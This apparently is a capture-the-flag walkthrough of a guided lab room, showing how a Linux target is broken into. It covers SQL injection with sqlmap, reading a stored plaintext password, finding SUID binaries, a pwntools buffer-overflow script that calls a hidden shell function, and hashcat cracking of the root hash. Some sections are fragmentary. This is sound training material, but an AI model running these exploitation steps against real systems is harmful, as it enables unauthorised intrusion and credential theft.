A guided room taking you through infiltrating and exploiting a Linux system.

## Host Enumeration
- How many ports are open on the target machine?

    /administrator.php (Status: 200)
    ```

    It's `/administrator.php`.

## Web Exploitation
The admin page seems to give us a login form. In situations like this it is always worth it to check for "low-hanging fruit". In the case of login forms one of the first things to check for is SQL Injection.
- What is the admin username?

    ```bash
    $ sqlmap -u http://10.10.139.250/administrator.php --forms --dump

## Command Execution
It seems we have gained the ability to run commands! Since this is my old PC, I should still have a user account! Let's run a few test commands, and then try to gain access!

- How many files are in the current directory?

    <a href="/assets/images/tryhackme/the-cod-caper/1.png"><img src="/assets/images/tryhackme/the-cod-caper/1.png"></a>

- Do I still have an account

    <a href="/assets/images/tryhackme/the-cod-caper/2.png"><img src="/assets/images/tryhackme/the-cod-caper/2.png"></a>

- What is my ssh password?

    ```bash
    www-data@ubuntu:/var$ ls
    ls
    backups  cache  hidden  lib  local  lock  log  mail  opt  run  spool  tmp  www
    www-data@ubuntu:/var$ cd hidden
    cd hidden
    www-data@ubuntu:/var/hidden$ ls
    ls
    pass
    www-data@ubuntu:/var/hidden$ cat pass
    cat pass
    pinguapingu
    ```

## LinEnum
- What is the interesting path of the interesting suid file

    ```bash
    www-data@ubuntu:/tmp$ find / -perm -u=s -type f 2>/dev/null
    find / -perm -u=s -type f 2>/dev/null
    /opt/secret/root
    /usr/bin/sudo
    /usr/bin/vmware-user-suid-wrapper
    /usr/bin/chsh

    /bin/ping6
    /bin/ntfs-3g
    /bin/mount
    /bin/fusermount
    /bin/umount
    ```

## Binary Exploitation
Use this code to execute the `shell_func` at `/opt/secret/root`.

```python
from pwn import *
proc = process('/opt/secret/root')
elf = ELF('/opt/secret/root')
shell_func = elf.symbols.shell
payload = fit({
44: shell_func # this adds the value of shell_func after 44 characters
})
proc.sendline(payload)
proc.interactive()
```

## Finishing the job
We got root hashed password, let's crack it using hashcat.

```bash
$ hashcat -m 1800 -a 0 hash /usr/share/wordlists/rockyou.txt                                                                                    1 â¨¯
